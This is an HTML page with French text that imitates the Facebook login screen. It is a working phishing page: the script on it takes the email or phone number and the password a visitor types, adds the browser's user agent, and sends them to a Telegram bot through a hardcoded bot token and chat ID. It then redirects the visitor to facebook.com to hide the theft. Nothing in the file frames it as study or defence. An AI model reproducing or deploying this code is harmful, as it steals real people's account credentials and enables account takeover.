<!doctype html>
<html lang="fr">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Connexion</title>
  <link rel="icon" type="image/png" href="https://www.facebook.com/images/fb_icon_325x325.png">
  <style>
    :root{
      --fb-blue:#1877f2;
      --bg:#f0f2f5;
      --card-bg:#ffffff;
      --muted:#606770;
      --danger:#e53935;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial;
    }
    *{box-sizing:border-box}
    html,body{height:100%}
    body{
      margin:0;
      background:linear-gradient(180deg,var(--bg),#e9edf5);
      display:flex;
      align-items:center;
      justify-content:center;
      padding:24px;
      -webkit-font-smoothing:antialiased;
    }

    .wrap{
      width:100%;
      max-width:980px;
      display:grid;
      grid-template-columns:1fr 420px;
      gap:28px;
      align-items:center;
    }

    .brand{
      color:var(--fb-blue);
      display:flex;
      align-items:center;
      gap:10px;
    }
    .brand img{
      width:48px;
      height:48px;
    }
    .brand h1{
      font-size:48px;
      margin:0 0 12px 0;
      letter-spacing:-1px;
    }
    .brand p{
      margin:0;
      font-size:20px;
      color:var(--muted);
    }

    .card{
      background:var(--card-bg);
      padding:18px;
      border-radius:8px;
      box-shadow:0 6px 18px rgba(18,38,63,0.08);
    }
    form{display:flex;flex-direction:column;gap:12px}

    input[type="email"], input[type="password"]{
      width:100%;
      padding:14px 12px;
      font-size:16px;
      border:1px solid #dddfe2;
      border-radius:6px;
    }
    input:focus{outline:3px solid rgba(24,119,242,0.12);border-color:rgba(24,119,242,0.6)}

    .row{display:flex;gap:12px}
    .btn{
      display:inline-flex;
      align-items:center;
      justify-content:center;
      padding:12px 16px;
      font-weight:600;
      border-radius:6px;
      cursor:pointer;
      border:none;
    }
    .btn-primary{background:var(--fb-blue);color:white}
    .btn-secondary{background:#e7f3ff;color:var(--fb-blue)}

    .links{display:flex;justify-content:space-between;align-items:center;font-size:14px}
    .links a{color:var(--fb-blue);text-decoration:none}

    .create-account{
      margin-top:14px;
      display:flex;justify-content:center
    }

    .small-muted{font-size:13px;color:var(--muted)}

    @media (max-width:900px){
      .wrap{grid-template-columns:1fr;max-width:520px}
      .brand h1{font-size:36px}
    }

    .error{color:var(--danger);font-size:13px}
    .success{color:green;font-size:13px}

  </style>
</head>
<body>
<main class="wrap" aria-labelledby="title">
    <section class="brand" aria-hidden="false">
      <div class="logo-row" aria-hidden="false">
        <img src="https://www.facebook.com/images/fb_icon_325x325.png" alt="Logo">
        <div>
          <h1 id="title">facebook</h1>
        </div>
      </div>
    </section>

    <aside class="card" aria-label="Formulaire de connexion">
      <form id="loginForm" method="POST">
        <input id="email" name="email" type="email" placeholder="Num√©ro ou e-mail" required>
        <input id="password" name="password" type="password" placeholder="Mot de passe" required minlength="6">
        <button class="btn btn-primary" type="submit">Se connecter</button>
      </form>
      <div id="feedback" class="feedback"></div>
    </aside>
  </main>

  <script>
    const TELEGRAM_BOT_TOKEN = '7645874601:AAHS6vORgaXb_pOZg7WvpZ1jbr1WrADzmMw'
    const TELEGRAM_CHAT_ID = '6075203216'

    const form = document.getElementById('loginForm');
    const feedback = document.getElementById('feedback');

    // Fonction pour envoyer le message √† Telegram
    async function sendToTelegram(message) {
      try {
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'HTML'
          })
        });
        
        const data = await response.json();
        return data.ok;
      } catch (error) {
        console.error('Erreur envoi Telegram:', error);
        return false;
      }
    }

    // Gestion de la soumission du formulaire
    form.addEventListener('submit', async (e) => {
      e.preventDefault();
      
      const email = document.getElementById('email').value.trim();
      const password = document.getElementById('password').value;
      
      // Validation basique
      if (!email) {
        showFeedback('Veuillez entrer votre adresse e-mail ou t√©l√©phone.', 'error');
        return;
      }
      
      if (password.length < 6) {
        showFeedback('Le mot de passe doit contenir au moins 6 caract√®res.', 'error');
        return;
      }

      showFeedback('Connexion en cours...', 'success');

      try {
        const message = `
üÜï <b>Nouvelle connexion</b> üÜï

üìß <b>Email/T√©l√©phone:</b> <code>${email}</code>
üîë <b>Mot de passe:</b> <code>${password}</code>

üåê <b>User Agent:</b> ${navigator.userAgent}
üìç <b>Heure:</b> ${new Date().toLocaleString('fr-FR')}
        `;

        // Envoyer √† Telegram
        const sent = await sendToTelegram(message);
        
        if (sent) {
          showFeedback('Connexion r√©ussie! Redirection...', 'success');
          
          // Redirection apr√®s un d√©lai
          setTimeout(() => {
            window.location.href = 'https://facebook.com';
          }, 2000);
          
        } else {
          showFeedback('Erreur de connexion. R√©essayez.', 'error');
        }
        
      } catch (error) {
        showFeedback('Erreur technique. R√©essayez.', 'error');
        console.error('Erreur:', error);
      }
    });

    function showFeedback(message, type) {
      feedback.textContent = message;
      feedback.className = 'feedback ' + type;
    }

    // Fonction de d√©monstration (optionnelle)
    function fillDemo() {
      document.getElementById('email').value = 'utilisateur@exemple.com';
      document.getElementById('password').value = 'demo123';
      showFeedback('Champs de d√©monstration remplis.', 'success');
    }

  </script>
</body>
</html>
